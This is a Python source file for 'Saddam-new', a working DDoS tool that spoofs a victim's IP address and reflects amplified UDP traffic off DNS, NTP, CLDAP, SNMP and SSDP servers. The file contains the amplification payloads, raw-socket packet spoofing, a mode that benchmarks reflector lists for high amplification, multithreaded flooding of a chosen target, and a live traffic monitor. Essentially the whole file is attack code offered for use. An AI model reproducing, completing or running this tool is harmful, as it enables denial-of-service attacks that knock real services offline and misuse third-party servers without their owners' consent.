#!/usr/bin/env python
#-*- coding:utf-8 -*-
'''
Saddam-new is based on Saddam: https://github.com/OffensivePython/Saddam
More information could be seen in Saddam-new project page: https://github.com/S4kur4/Saddam-new
'''

import re
import os
import sys
import time
import random
import string
import socket
import struct
import argparse
import threading
from random import randint
from optparse import OptionParser
from pinject import IP, UDP


BANNER = r'''                                             
 _____       _   _                             
|   __|___ _| |_| |___ _____ ___ ___ ___ _ _ _ 
|__   | .'| . | . | .'|     |___|   | -_| | | |
|_____|__,|___|___|__,|_|_|_|   |_|_|___|_____|
'''

EXAMPLE = 'Example: python saddam_new.py -n ./ntplist.txt -t 10 -a target.com'

HELP = (
	'DNS Amplification List Fileand Domains to Resolve (e.g: dns.txt:[evildomain.com|domains_file.txt]',
	'NTP Amplification List File',
	'CLDAP Amplification List File',
	'SNMP Amplification List File',
	'SSDP Amplification List File',
	'Threads Number (default=1)',
	'Calculate Amplification Factor',
	'Aim To Attack')

BENCHMARK = (
	'Protocol'
	'|  IP  Address  '
	'|     Amplification     '
	'|     Domain    '
	'\n{}').format('-'*75)

ATTACK = (
	'     Sent      '
	'|    Traffic    '
	'|    Packet/s   '
	'|     Bit/s     '
	'\n{}').format('-'*63)

PORT = {
	'dns': 53,
	'ntp': 123,
	'cldap':389,
	'snmp': 161,
	'ssdp': 1900 }

PAYLOAD = {
	'dns': ('{}\x01\x00\x00\x01\x00\x00\x00\x00\x00\x01'
			'{}\x00\x00\xff\x00\xff\x00\x00\x29\x10\x00'
			'\x00\x00\x00\x00\x00\x00'),
	'snmp':('\x30\x26\x02\x01\x01\x04\x06\x70\x75\x62\x6c'
		'\x69\x63\xa5\x19\x02\x04\x71\xb4\xb5\x68\x02\x01'
		'\x00\x02\x01\x7F\x30\x0b\x30\x09\x06\x05\x2b\x06'
		'\x01\x02\x01\x05\x00'),
	'ntp':('\x17\x00\x02\x2a'+'\x00'*4),
	'cldap':('\x30\x25\x02\x01\x01\x63\x20\x04\x00\x0a\x01'
		'\x00\x0a\x01\x00\x02\x01\x00\x02\x01\x00\x01\x01'
		'\x00\x87\x0b\x6f\x62\x6a\x65\x63\x74\x63\x6c\x61'
		'\x73\x73\x30\x00\x00'),
	'ssdp':('M-SEARCH * HTTP/1.1\r\nHOST: 239.255.255.250:1900\r\n'
		'MAN: "ssdp:discover"\r\nMX: 2\r\nST: ssdp:all\r\n\r\n')
}

amplification = {
	'dns': {},
	'ntp': {},
	'cldap': {},
	'snmp': {},
	'ssdp': {} } # Amplification factor

FILE_NAME = 0 # Index of files names
FILE_HANDLE = 1 # Index of files descriptors

npackets = 0 # Number of packets sent
nbytes = 0	# Number of bytes reflected
task = {} # The values needed for the final task to be executed will be put here.

SUFFIX = {
	0: '',
	1: 'K',
	2: 'M',
	3: 'G',
	4: 'T'}

def Calc(n, d, unit=''):
	i = 0
	r = float(n)
	while r/d>=1:
		r = r/d
		i+= 1
	return '{:.2f}{}{}'.format(r, SUFFIX[i], unit)

def Monitor():
	'''
		Monitor attack
	'''
	print ATTACK
	FMT = '{:^15}|{:^15}|{:^15}|{:^15}'
	start = time.time()
	while True:
		try:
			current = time.time() - start
			bps = (nbytes*8)/current
			pps = npackets/current
			out = FMT.format(Calc(npackets, 1000), 
				Calc(nbytes, 1024, 'B'), Calc(pps, 1000, 'pps'), Calc(bps, 1000, 'bps'))
			sys.stderr.write('\r{}{}'.format(out, ' '*(60-len(out))))
			time.sleep(1)
		except KeyboardInterrupt:
			print '\nInterrupted'
			break
		except Exception as err:
			print '\nError:', str(err)
			break

def AmpFactor(recvd, sent):
	return '{}x ({}B -> {}B)'.format(recvd/sent, sent, recvd)

def Benchmark(ddos):
	i = 0
	alive = [] # Remove servers that are no longer available, leaving the rest here
	print BENCHMARK
	for proto in task:
		if os.path.getsize(task[proto][FILE_NAME]) == 0:
			msg = "saddam_new.py: error: amplification list file you specified is null"
			sys.exit(msg)
		f = open(task[proto][FILE_NAME], 'r')
		while True:
			soldier = f.readline().strip()
			if soldier:
				if proto == 'dns':
					for domain in ddos.domains:
						i += 1
						recvd, sent = ddos.GetAmpSize(proto, soldier, domain)
						if recvd/sent:
							print '{:^8}|{:^15}|{:^23}|{}'.format(proto, soldier, 
								AmpFactor(recvd, sent), domain)
							if recvd/sent > 1:
								alive.append(soldier)
						else:
							continue
				else:
					recvd, sent = ddos.GetAmpSize(proto, soldier)
					if recvd/sent > 1:
						alive.append(soldier)
					print '{:^8}|{:^15}|{:^23}|{}'.format(proto, soldier, 
						AmpFactor(recvd, sent), 'N/A')
					i+= 1
			else:
				break
		print 'Total tested:', i
		f.close()
	msg = "save the available servers to a new file (y/n)?:"
	does_save = raw_input(msg)
	while 'y' != does_save and 'n' != does_save:
		does_save = raw_input(msg)
	if 'y' == does_save:
		filename = "./" + str(random.randint(10000, 100000)) + ".txt"
		with open(filename, 'w') as f:
			for server in alive:
				f.write(server+'\n')
		print "new amplification list file saved: {}".format(os.path.realpath(filename))
	if 'n' == does_save:
			pass

def GetDomainList(domains):
	domain_list = []

	if '.TXT' in domains.upper():
		if os.path.getsize(domains) == 0:
			msg = "saddam_new.py: error: domain files you specified is null"
			sys.exit(msg)
		file = open(domains, 'r')
		content = file.read()
		file.close()
		content = content.replace('\r', '')
		content = content.replace(' ', '')
		content = content.split('\n')
		for domain in content:
			if domain:
				domain_list.append(domain)
	else:
		domain_list = domains.split(',')
	return domain_list

def Parse():
	parser = argparse.ArgumentParser(description=EXAMPLE, add_help=False)
	option = parser.add_argument_group('Options')
	option.add_argument('-h', '--help', action='help', help='Show Help Message And Exit')
	option.add_argument('--benchmark', action='store_true', help=HELP[6])
	option.add_argument('-a', '--aim', dest='aim', type=str, metavar='DOMAIN|IP', help=HELP[7])
	option.add_argument('-d', '--dns', dest='dns', metavar='FILE:FILE|DOMAIN', help=HELP[0])
	option.add_argument('-n', '--ntp', dest='ntp', metavar='FILE', help=HELP[1])
	option.add_argument('-c', '--cldap', dest='cldap', metavar='FILE', help=HELP[2])
	option.add_argument('-s', '--snmp', dest='snmp', metavar='FILE', help=HELP[3])
	option.add_argument('-p', '--ssdp', dest='ssdp', metavar='FILE', help=HELP[4])
	option.add_argument('-t', '--threads', dest='threads', type=int, default=1, metavar='N', help=HELP[5])
	
	domains = None 
	# When use -d mode, this variable is used to store the domain names you need to be resolved.
	
	args = parser.parse_args().__dict__
	# Get arguments from command line.

	msg0 = "saddam_new.py: error: missing mandatory options (-a|--benchmark, -d|-n|-c|-s|-p), use -h for help"
	if len(sys.argv) == 1:
		sys.exit(msg0)
	if '-t' in sys.argv and len(sys.argv) <= 3:
		sys.exit(msg0)

	if args['benchmark']:
		msg1 = "saddam_new.py: error: missing a mandatory option (-d|-n|-c|-s|-p), use -h for help"
		if '-t' not in sys.argv and len(sys.argv) <= 3:
			sys.exit(msg1)
		if '-t' in sys.argv and len(sys.argv) <= 5:
			sys.exit(msg1)

	if args['aim']:
		msg2 = "saddam_new.py: error: missing a mandatory option (-d|-n|-c|-s|-p), use -h for help"
		msg3 = "saddam_new.py: error: invalid aim address, check your -a option (e.g: -a www.target.com)"
		regular1 = re.match(r'([a-zA-Z0-9-]+\.){1,3}[a-zA-Z]+', args['aim'], re.I)
		regular2 = re.match(r'([0-9]{1,3}\.){3}[0-9]{1,3}', args['aim'])
		if '-t' not in sys.argv and len(sys.argv) <= 3:
			sys.exit(msg2)
		if '-t' in sys.argv and len(sys.argv) <= 5:
			sys.exit(msg2)
		if not regular1 and not regular2:
			sys.exit(msg3)
	
	if args['dns']:
		msg4 = "saddam_new.py: error: specify domains to resolve, check your -d option (e.g: -d dns.txt:evildomain.com)"
		if ':' not in args['dns']:
			sys.exit(msg4)
		dns_file, domains = args['dns'].split(':')
		domains = GetDomainList(domains)
		if domains:
			task['dns'] = [dns_file]
		else:
			sys.exit(msg4)
	
	args['domains'] = domains

	for prtocol in ['ntp', 'cldap', 'snmp', 'ssdp']:
		if args[prtocol]:
			if os.path.getsize(args[prtocol]) == 0:
				msg5 = "saddam_new.py: error: amplification list file you specified is null"
				sys.exit(msg5)
			task[prtocol] = [args[prtocol]]

	return args

class DDoS(object):
	def __init__(self, target, threads, domains, event):
		self.target = target
		self.threads = threads
		self.event = event
		self.domains = domains
	def stress(self):
		for i in range(self.threads):
			t = threading.Thread(target=self.__attack)
			t.start()
	def __send(self, sock, soldier, proto, payload):
		'''
			Send a Spoofed Packet
		'''
		
		udp = UDP(random.randint(1, 65535), PORT[proto], payload).pack(self.target, soldier)
		ip = IP(self.target, soldier, udp, proto=socket.IPPROTO_UDP).pack()
		sock.sendto(ip+udp+payload, (soldier, PORT[proto]))
	def GetAmpSize(self, proto, soldier, domain=''):
		'''
			Get Amplification Size
		'''
		sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
		sock.settimeout(2)
		data = ''
		if proto in ['ntp', 'ssdp']:
			packet = PAYLOAD[proto]
			sock.sendto(packet, (soldier, PORT[proto]))
			try:
				while True:
					data+= sock.recvfrom(65535)[0]
			except socket.timeout:
				sock.close()
				return len(data), len(packet)
		if proto=='dns':
			packet = self.__GetDnsQuery(domain)
		else:
			packet = PAYLOAD[proto]
		try:
			sock.sendto(packet, (soldier, PORT[proto]))
			data, _ = sock.recvfrom(65535)
		except socket.timeout:
			data = ''
		finally:
			sock.close()
		return len(data), len(packet)
	def __GetQName(self, domain):
		'''
			QNAME A domain name represented as a sequence of labels 
			where each label consists of a length
			octet followed by that number of octets
		'''
		labels = domain.split('.')
		QName = ''
		for label in labels:
			if len(label):
				QName += struct.pack('B', len(label)) + label
		return QName
	def __GetDnsQuery(self, domain):
		id = struct.pack('H', randint(0, 65535))
		QName = self.__GetQName(domain)
		return PAYLOAD['dns'].format(id, QName)
	def __attack(self):
		global npackets
		global nbytes
		_task = task
		for proto in _task: # Open Amplification files
			f = open(_task[proto][FILE_NAME], 'r')
			_task[proto].append(f)		# _files = {'proto':['file_name', file_handle]}
		sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
		i = 0
		while self.event.isSet():
			for proto in _task:
				soldier = _task[proto][FILE_HANDLE].readline().strip()
				if soldier:
					if proto=='dns':
						if not amplification[proto].has_key(soldier):
							amplification[proto][soldier] = {}
						for domain in self.domains:
							if not amplification[proto][soldier].has_key(domain):
								size, _ = self.GetAmpSize(proto, soldier, domain)
								if size==0:
									break
								elif size<len(PAYLOAD[proto]):
									continue
								else:
									amplification[proto][soldier][domain] = size
							amp = self.__GetDnsQuery(domain)
							self.__send(sock, soldier, proto, amp)
							npackets += 1
							i+=1
							nbytes += amplification[proto][soldier][domain]
					else:
						if not amplification[proto].has_key(soldier):
							size, _ = self.GetAmpSize(proto, soldier)
							if size<len(PAYLOAD[proto]):
								continue
							else:
								amplification[proto][soldier] = size
						amp = PAYLOAD[proto]
						npackets += 1
						i+=1
						nbytes += amplification[proto][soldier]
						self.__send(sock, soldier, proto, amp)
				else:
					_task[proto][FILE_HANDLE].seek(0)
		sock.close()
		for proto in _task:
			_task[proto][FILE_HANDLE].close()

def main():
	print BANNER
	args = Parse()
	
	'''TEST mode
	print args
	print task
	if task:
		event = threading.Event()
		event.set()
		if args['benchmark']:
			ddos = DDoS('BENCHMARK', args['threads'], args['domains'], event)
			Benchmark(ddos)
		else:
			ddos = DDoS(socket.gethostbyname(args['aim']), args['threads'], args['domains'], event)
			ddos.stress()
			Monitor()
			event.clear()
	else:
		sys.exit()
	'''

	try:
		if task:
			event = threading.Event()
			event.set()
			if args['benchmark']:
				ddos = DDoS('BENCHMARK', args['threads'], args['domains'], event)
				Benchmark(ddos)
			else:
				ddos = DDoS(socket.gethostbyname(args['aim']), args['threads'], args['domains'], event)
				ddos.stress()
				Monitor()
				event.clear()
		else:
			sys.exit()
	except Exception:
		msg = "saddam_new.py: error: unable to resolve the IP address you specified use -a"
		sys.exit(msg)

if __name__ == '__main__':
	main()